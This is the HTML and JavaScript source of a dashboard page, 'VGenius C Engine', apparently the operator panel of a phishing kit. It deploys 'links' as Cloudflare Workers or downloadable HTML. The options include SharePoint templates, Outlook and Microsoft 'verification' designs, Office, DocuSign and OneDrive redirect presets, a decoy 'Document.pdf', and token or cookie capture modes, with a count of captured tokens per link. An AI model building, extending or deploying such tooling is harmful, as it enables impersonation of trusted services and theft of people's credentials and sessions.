<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Links – VGenius C Engine</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="assets/css/user.css">
</head>
<body>
    <aside class="main-sidebar" id="mainSidebar"></aside>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
    <nav class="main-header navbar"></nav>

    <main class="content-wrapper">
        <div class="page-header">
            <h1 class="page-title">My Links</h1>
            <button class="btn-accent-sm" style="padding:12px 24px;font-size:12px;" onclick="openDrawer()"><i class="fas fa-plus"></i> Create New</button>
        </div>

        <div class="card" style="overflow:hidden;">
            <table class="links-table">
                <thead><tr><th>#</th><th>Name</th><th>URL</th><th>Mode</th><th>Template</th><th>Tokens</th><th>Status</th><th>Action</th></tr></thead>
                <tbody id="linksTableBody"><tr><td colspan="8" class="empty-state"><i class="fas fa-link"></i>No links created yet.</td></tr></tbody>
            </table>
        </div>
    </main>

    <!-- Drawer Overlay -->
    <div class="drawer-overlay" id="drawerOverlay" onclick="closeDrawer()"></div>
    <div class="drawer" id="createDrawer">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
            <h3 style="margin:0;font-family:var(--font-heading);font-size:14px;letter-spacing:0.06em;"><i class="fas fa-plus-circle" style="color:var(--accent);margin-right:8px;"></i> Create New Link</h3>
            <button onclick="closeDrawer()" style="background:none;border:none;color:var(--muted);cursor:pointer;font-size:18px;"><i class="fas fa-times"></i></button>
        </div>

        <!-- Deployment Mode Cards -->
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px;">
            <label class="deploy-mode-card active" id="modeCF" onclick="switchTab('cloudflare')" style="display:flex;align-items:center;gap:10px;padding:14px;border:1px solid var(--accent);border-radius:12px;cursor:pointer;transition:all 0.2s;background:rgba(0,255,204,0.06);">
                <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:rgba(0,255,204,0.1);flex-shrink:0;"><i class="fas fa-cloud" style="color:var(--accent);font-size:16px;"></i></div>
                <div><div style="font-size:12px;font-weight:700;">Cloudflare Worker</div><div style="font-size:10px;color:var(--muted);margin-top:2px;">Deploy to workers.dev</div></div>
            </label>
            <label class="deploy-mode-card" id="modeExport" onclick="switchTab('export')" style="display:flex;align-items:center;gap:10px;padding:14px;border:1px solid var(--border);border-radius:12px;cursor:pointer;transition:all 0.2s;background:transparent;">
                <div style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:10px;background:rgba(255,255,255,0.03);flex-shrink:0;"><i class="fas fa-file-code" style="color:var(--muted);font-size:16px;"></i></div>
                <div><div style="font-size:12px;font-weight:700;">Static Export</div><div style="font-size:10px;color:var(--muted);margin-top:2px;">Download HTML file</div></div>
            </label>
        </div>

        <div id="tabCloudflare">
            <div class="form-group">
                <label><i class="fas fa-tag" style="margin-right:4px;"></i> Worker Name</label>
                <input type="text" id="workerName" placeholder="e.g., secure-docs" oninput="updateUrlPreview()" style="font-family:var(--font-heading);font-size:12px;">
                <div id="urlPreview" style="margin-top:6px;font-family:var(--font-heading);font-size:10px;color:var(--accent);display:none;">
                    <i class="fas fa-link" style="margin-right:4px;"></i> <span id="urlPreviewText"></span>
                </div>
                <div class="helper-text">Lowercase letters, numbers, hyphens (3-50 chars)</div>
            </div>
            <div class="form-group">
                <label><i class="fas fa-shield-halved" style="margin-right:4px;"></i> Auth Mode</label>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                    <label style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1px solid var(--accent);border-radius:8px;cursor:pointer;font-size:12px;background:rgba(0,255,204,0.06);" id="authTokenLabel">
                        <input type="radio" name="authMode" value="token" checked onchange="document.getElementById('authMode').value='token';updateAuthStyle()" style="display:none;">
                        <i class="fas fa-key" style="color:var(--accent);font-size:11px;"></i> Token
                    </label>
                    <label style="display:flex;align-items:center;gap:8px;padding:10px 12px;border:1px solid var(--border);border-radius:8px;cursor:pointer;font-size:12px;" id="authCookieLabel">
                        <input type="radio" name="authMode" value="cookie" onchange="document.getElementById('authMode').value='cookie';updateAuthStyle()" style="display:none;">
                        <i class="fas fa-cookie" style="color:var(--muted);font-size:11px;"></i> Cookie
                    </label>
                </div>
                <select id="authMode" style="display:none;"><option value="token">Token</option><option value="cookie">Cookie</option></select>
            </div>
            <div class="form-group">
                <label><i class="fas fa-globe" style="margin-right:4px;"></i> URL Type</label>
                <select id="urlType" onchange="toggleUrlTypeFields()"><option value="worker">Workers.dev URL</option><option value="custom">Custom Domain</option></select>
            </div>
            <div class="form-group" id="existingWorkersField"><label>Select Worker</label><select id="existingWorkers"><option value="">Choose a worker</option></select></div>
            <div id="customDomainFields" style="display:none;">
                <div class="form-group"><label>Select Domain</label><select id="customDomain"><option value="">Select a domain</option></select></div>
                <div class="form-group">
                    <label>Domain Connection</label>
                    <div style="display:flex;gap:8px;">
                        <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;padding:8px 12px;border:1px solid var(--accent);border-radius:8px;flex:1;justify-content:center;"><input type="radio" name="domainConn" value="subdomain" checked onchange="toggleRouteName()" style="display:none;"> Subdomain</label>
                        <label style="display:flex;align-items:center;gap:6px;font-size:12px;cursor:pointer;padding:8px 12px;border:1px solid var(--border);border-radius:8px;flex:1;justify-content:center;"><input type="radio" name="domainConn" value="root" onchange="toggleRouteName()" style="display:none;"> Root</label>
                    </div>
                </div>
                <div class="form-group" id="routeNameField"><label>Route Name</label><input type="text" id="routeName" placeholder="e.g., secure-docs"></div>
            </div>
        </div>
        <div id="tabExport" style="display:none;">
            <div class="form-group">
                <label><i class="fas fa-download" style="margin-right:4px;"></i> Export Mode</label>
                <select id="exportMode"><option value="download">Download HTML File</option><option value="bunny">Deploy to Bunny CDN</option></select>
            </div>
            <div style="padding:12px;background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.2);border-radius:8px;font-size:11px;color:#f59e0b;margin-top:4px;display:flex;align-items:flex-start;gap:8px;">
                <i class="fas fa-info-circle" style="margin-top:2px;flex-shrink:0;"></i>
                <span>Generate a self-contained HTML file. Upload to any static host or Bunny CDN.</span>
            </div>
        </div>

        <div style="border-top:1px solid var(--border);margin:16px 0;padding-top:16px;">
            <div class="form-group">
                <label><i class="fas fa-cube" style="margin-right:4px;"></i> Template Type</label>
                <select id="templateType"><option value="">Loading templates...</option></select>
            </div>
            <div class="form-group">
                <label><i class="fas fa-palette" style="margin-right:4px;"></i> Verification Design</label>
                <select id="verificationDesign"><option value="">Loading designs...</option></select>
            </div>
        </div>

        <div style="border-top:1px solid var(--border);margin:16px 0;padding-top:16px;">
            <div class="form-group">
                <label><i class="fas fa-external-link-alt" style="margin-right:4px;"></i> Destination URL</label>
                <input type="text" id="destUrl" value="https://office.com" style="font-size:12px;">
            </div>
            <div style="display:flex;gap:6px;margin-top:-8px;margin-bottom:12px;flex-wrap:wrap;">
                <span class="dest-preset" onclick="document.getElementById('destUrl').value='https://office.com'">Office</span>
                <span class="dest-preset" onclick="document.getElementById('destUrl').value='https://microsoft.com'">Microsoft</span>
                <span class="dest-preset" onclick="document.getElementById('destUrl').value='https://docusign.com'">DocuSign</span>
                <span class="dest-preset" onclick="document.getElementById('destUrl').value='https://onedrive.live.com'">OneDrive</span>
            </div>
        </div>

        <div class="form-group">
            <label><i class="fas fa-layer-group" style="margin-right:4px;"></i> Background Blur <span id="blurValue" style="color:var(--accent);font-weight:700;">4px</span></label>
            <input type="range" id="bgBlur" min="0" max="10" value="4" style="width:100%;accent-color:var(--accent);" oninput="document.getElementById('blurValue').textContent=this.value+'px'">
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;">
            <div class="form-group"><label><i class="fas fa-file" style="margin-right:4px;"></i> File Name</label><input type="text" id="fileName" value="Document.pdf" style="font-size:12px;"></div>
            <div class="form-group"><label><i class="fas fa-copy" style="margin-right:4px;"></i> Pages</label><input type="number" id="pages" value="1" style="font-size:12px;"></div>
        </div>
        <div class="form-group"><label><i class="fas fa-font" style="margin-right:4px;"></i> Button Text</label><input type="text" id="buttonText" placeholder="Leave empty for default" style="font-size:12px;"></div>

        <button class="btn-accent-sm" style="width:100%;padding:14px;margin-top:20px;font-size:12px;letter-spacing:0.06em;" onclick="deployLink()" id="deployBtn"><i class="fas fa-rocket"></i> Deploy Worker</button>
    </div>

    <script src="assets/js/user.js"></script>
    <script>
        const token = getToken();
        if (!token) window.location.href = 'index.html';
        let activeTab = 'cloudflare';
        let allLinksCache = [];

        initShared('links');

        // Dynamic dropdown loading
        async function loadTemplateDropdown() {
            try {
                const res = await fetch(`${API}/templates`, { headers: authHeaders() });
                const data = await res.json();
                const sel = document.getElementById('templateType');
                const templates = data.templates || [];
                if (templates.length === 0) {
                    sel.innerHTML = '<option value="sharepoint3">SharePoint 3</option>';
                } else {
                    sel.innerHTML = templates.map(t => `<option value="${t.template_key || t.name}">${t.name}</option>`).join('');
                }
            } catch (e) {
                document.getElementById('templateType').innerHTML = '<option value="sharepoint3">SharePoint 3</option>';
            }
        }

        async function loadDesignDropdown() {
            try {
                const res = await fetch(`${API}/templates/designs`, { headers: authHeaders() });
                const designs = await res.json();
                const sel = document.getElementById('verificationDesign');
                if (!designs.length) {
                    sel.innerHTML = '<option value="outlook">Outlook</option><option value="minimal-clean">Minimal Clean</option><option value="microsoft">Microsoft</option><option value="slider">Slider</option>';
                } else {
                    sel.innerHTML = designs.map(d => `<option value="${d.name}">${d.name}</option>`).join('');
                }
            } catch (e) {
                document.getElementById('verificationDesign').innerHTML = '<option value="outlook">Outlook</option><option value="minimal-clean">Minimal Clean</option><option value="microsoft">Microsoft</option><option value="slider">Slider</option>';
            }
        }

        async function loadLinks() {
            const res = await fetch(`${API}/links?status=active`, { headers: authHeaders() });
            const links = await res.json();
            allLinksCache = links;
            const tbody = document.getElementById('linksTableBody');
            if (!links.length) {
                tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><i class="fas fa-link"></i>No links created yet.</td></tr>';
            } else {
                tbody.innerHTML = links.map((l, i) => `
                    <tr>
                        <td>${i+1}</td>
                        <td>${l.name || 'Untitled'}</td>
                        <td style="font-family:var(--font-heading);font-size:10px;">${l.public_url || l.worker_name || l.custom_domain || '—'}</td>
                        <td><span class="badge">${l.auth_mode === 'cookie' ? 'Cookie' : 'Token'}</span></td>
                        <td>${l.template_type}</td>
                        <td>${l.token_count || 0}</td>
                        <td><label style="position:relative;width:40px;height:20px;display:inline-block;"><input type="checkbox" ${l.status === 'active' ? 'checked' : ''} onchange="toggleLink(${l.id}, this.checked)" style="opacity:0;width:0;height:0;"><span style="position:absolute;cursor:pointer;inset:0;background:#18181b;border-radius:20px;transition:0.25s;"></span><span style="position:absolute;height:14px;width:14px;left:3px;bottom:3px;background:#71717a;border-radius:50%;transition:0.25s;"></span></label></td>
                        <td>
                            <button class="btn-outline" style="padding:4px 8px;font-size:10px;" onclick="copyLinkUrl('${l.public_url || l.worker_name || l.custom_domain}')"><i class="fas fa-copy"></i></button>
                            <button class="btn-danger-sm" style="padding:4px 8px;font-size:10px;" onclick="deleteLink(${l.id})"><i class="fas fa-trash"></i></button>
                        </td>
                    </tr>
                `).join('');
            }
        }

        async function openDrawer() {
            document.getElementById('drawerOverlay').classList.add('open');
            document.getElementById('createDrawer').classList.add('open');
            switchTab('cloudflare');
        }

        function closeDrawer() { document.getElementById('drawerOverlay').classList.remove('open'); document.getElementById('createDrawer').classList.remove('open'); }

        function switchTab(tab) {
            activeTab = tab;
            // Update deployment mode cards
            const cf = document.getElementById('modeCF');
            const exp = document.getElementById('modeExport');
            if (tab === 'cloudflare') {
                cf.style.borderColor = 'var(--accent)'; cf.style.background = 'rgba(0,255,204,0.06)';
                cf.querySelector('div div:last-child').style.color = 'var(--accent)';
                exp.style.borderColor = 'var(--border)'; exp.style.background = 'transparent';
                exp.querySelector('div div:last-child').style.color = 'var(--muted)';
            } else {
                exp.style.borderColor = 'var(--accent)'; exp.style.background = 'rgba(0,255,204,0.06)';
                exp.querySelector('div div:last-child').style.color = 'var(--accent)';
                cf.style.borderColor = 'var(--border)'; cf.style.background = 'transparent';
                cf.querySelector('div div:last-child').style.color = 'var(--muted)';
            }
            document.getElementById('tabCloudflare').style.display = tab === 'cloudflare' ? 'block' : 'none';
            document.getElementById('tabExport').style.display = tab === 'export' ? 'block' : 'none';
            const btn = document.getElementById('deployBtn');
            btn.innerHTML = tab === 'cloudflare' ? '<i class="fas fa-rocket"></i> Deploy Worker' : '<i class="fas fa-download"></i> Generate & Download';
        }

        function updateUrlPreview() {
            const name = document.getElementById('workerName').value.trim();
            const preview = document.getElementById('urlPreview');
            const text = document.getElementById('urlPreviewText');
            if (name) {
                const subdomain = document.getElementById('cfWorkersSubdomain') ? '' : '';
                text.textContent = name + '.workers.dev';
                preview.style.display = 'block';
            } else {
                preview.style.display = 'none';
            }
        }

        function updateAuthStyle() {
            const mode = document.querySelector('input[name="authMode"]:checked').value;
            const tokenLabel = document.getElementById('authTokenLabel');
            const cookieLabel = document.getElementById('authCookieLabel');
            if (mode === 'token') {
                tokenLabel.style.borderColor = 'var(--accent)'; tokenLabel.style.background = 'rgba(0,255,204,0.06)';
                tokenLabel.querySelector('i').style.color = 'var(--accent)';
                cookieLabel.style.borderColor = 'var(--border)'; cookieLabel.style.background = 'transparent';
                cookieLabel.querySelector('i').style.color = 'var(--muted)';
            } else {
                cookieLabel.style.borderColor = 'var(--accent)'; cookieLabel.style.background = 'rgba(0,255,204,0.06)';
                cookieLabel.querySelector('i').style.color = 'var(--accent)';
                tokenLabel.style.borderColor = 'var(--border)'; tokenLabel.style.background = 'transparent';
                tokenLabel.querySelector('i').style.color = 'var(--muted)';
            }
        }

        function toggleUrlTypeFields() {
            const t = document.getElementById('urlType').value;
            document.getElementById('existingWorkersField').style.display = t === 'worker' ? 'block' : 'none';
            document.getElementById('customDomainFields').style.display = t === 'custom' ? 'block' : 'none';
        }
        function toggleRouteName() { document.getElementById('routeNameField').style.display = document.querySelector('input[name="domainConn"]:checked').value === 'subdomain' ? 'block' : 'none'; }

        async function deployLink() {
            const btn = document.getElementById('deployBtn');
            btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
            const body = {
                worker_name: document.getElementById('workerName').value || 'link-' + Date.now(),
                auth_mode: document.getElementById('authMode').value,
                template_type: document.getElementById('templateType').value,
                verification_design: document.getElementById('verificationDesign').value,
                destination_url: document.getElementById('destUrl').value,
                file_name: document.getElementById('fileName').value,
                pages: parseInt(document.getElementById('pages').value) || 1,
                button_text: document.getElementById('buttonText').value,
                background_blur: parseInt(document.getElementById('bgBlur').value),
                url_type: activeTab === 'export' ? 'export' : document.getElementById('urlType').value
            };
            try {
                const res = await fetch(`${API}/links`, { method: 'POST', headers: authHeaders(), body: JSON.stringify(body) });
                const data = await res.json();
                if (!data.id) { showToast(data.error || 'Failed', true); }
                else {
                    if (activeTab === 'export') {
                        const exportRes = await fetch(`${API}/links/${data.id}/export`, { headers: authHeaders() });
                        if (exportRes.ok) {
                            const blob = await exportRes.blob();
                            const url = window.URL.createObjectURL(blob);
                            const a = document.createElement('a'); a.href = url; a.download = `vgenius-${data.worker_name || data.id}.html`; a.click();
                            window.URL.revokeObjectURL(url); showToast('HTML downloaded');
                        }
                    } else { showToast('Worker deployed successfully'); }
                    closeDrawer(); loadLinks();
                }
            } catch (e) { showToast('Error: ' + e.message, true); }
            btn.disabled = false; btn.innerHTML = activeTab === 'cloudflare' ? '<i class="fas fa-rocket"></i> Deploy Worker' : '<i class="fas fa-download"></i> Generate & Download';
        }

        function copyLinkUrl(url) { if (!url) return; if (!url.startsWith('http')) url = url.includes('.') ? `https://${url}` : `https://${url}.workers.dev`; navigator.clipboard.writeText(url).then(() => showToast('URL copied')); }
        async function toggleLink(id) { await fetch(`${API}/links/${id}/toggle`, { method: 'POST', headers: authHeaders() }); }
        async function deleteLink(id) {
            showConfirm({
                title: 'Delete Link',
                message: 'Are you sure you want to delete this link? The associated worker will be removed. This action cannot be undone.',
                confirmText: 'Delete',
                onConfirm: async () => {
                    await fetch(`${API}/links/${id}`, { method: 'DELETE', headers: authHeaders() });
                    loadLinks();
                    showToast('Link deleted');
                }
            });
        }

        document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeDrawer(); });
        loadLinks();
        loadTemplateDropdown();
        loadDesignDropdown();
    </script>
</body>
</html>
